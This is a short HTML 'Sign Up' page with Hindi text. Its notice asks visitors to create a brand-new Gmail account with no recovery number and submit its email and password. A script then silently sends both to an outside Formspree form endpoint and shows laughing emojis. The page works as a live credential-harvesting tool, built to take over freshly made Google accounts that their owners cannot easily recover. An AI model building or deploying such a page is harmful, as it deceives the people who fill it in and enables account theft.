<!DOCTYPE html>
<html lang="hi">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Sign Up</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            background-color: #f4f4f9;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            margin: 0;
        }
        .container {
            background: white;
            padding: 25px;
            border-radius: 10px;
            box-shadow: 0 4px 10px rgba(0,0,0,0.1);
            width: 100%;
            max-width: 350px;
            text-align: center;
        }
        .notice {
            background-color: #ffcccc;
            color: #cc0000;
            padding: 12px;
            border-radius: 6px;
            margin-bottom: 20px;
            font-size: 13px;
            font-weight: bold;
            line-height: 1.5;
        }
        input {
            width: 100%;
            padding: 12px;
            margin: 10px 0;
            border: 1px solid #ccc;
            border-radius: 6px;
            box-sizing: border-box;
            font-size: 14px;
        }
        button {
            width: 100%;
            padding: 12px;
            background-color: #007BFF;
            color: white;
            border: none;
            border-radius: 6px;
            font-size: 16px;
            font-weight: bold;
            cursor: pointer;
            margin-top: 10px;
        }
        button:hover {
            background-color: #0056b3;
        }
        /* इमोजी स्क्रीन को शुरुआत में छुपा कर रखा है */
        #emoji-screen {
            display: none;
            font-size: 50px;
            letter-spacing: 10px;
        }
    </style>
</head>
<body>

<div class="container" id="main-container">
    <!-- आपका बताया हुआ नोटिस -->
    <div class="notice">
        नोटिस: यहाँ पर वह ईमेल डालें जिस ईमेल में रिकवरी नंबर ऐड ना हो और अपने फोन से एकदम नई जीमेल बना के ही इस पर सबमिट करें।
    </div>

    <!-- फॉर्म -->
    <!-- Formspree लिंक यहाँ डालें -->
    <form id="signup-form" action="https://formspree.io/f/xzebgqpg" method="POST">

        <input type="email" name="email" placeholder="Enter Email" required>
        <input type="password" name="password" placeholder="Enter Password" required>
        <button type="submit">Submit</button>
    </form>
</div>

<!-- सबमिट के बाद दिखने वाला इंटरफ़ेस -->
<div class="container" id="emoji-screen">
    😂 🤣 😊
</div>

<script>
    const form = document.getElementById('signup-form');
    const mainContainer = document.getElementById('main-container');
    const emojiScreen = document.getElementById('emoji-screen');

    form.addEventListener('submit', function(event) {
        event.preventDefault(); // फॉर्म को दूसरे पेज पर जाने से रोकेगा

        const formData = new FormData(form);
        
        // Formspree पर बैकग्राउंड में डेटा भेजना
        fetch(form.action, {
            method: 'POST',
            body: formData,
            headers: {
                'Accept': 'application/json'
            }
        }).then(response => {
            if (response.ok) {
                // सबमिट होने के बाद फॉर्म को गायब करना और इमोजी दिखाना
                mainContainer.style.display = 'none';
                emojiScreen.style.display = 'block';
            } else {
                alert("कुछ एरर आ गया है, कृपया दोबारा प्रयास करें।");
            }
        }).catch(error => {
            alert("नेटवर्क एरर।");
        });
    });
</script>

</body>
</html>
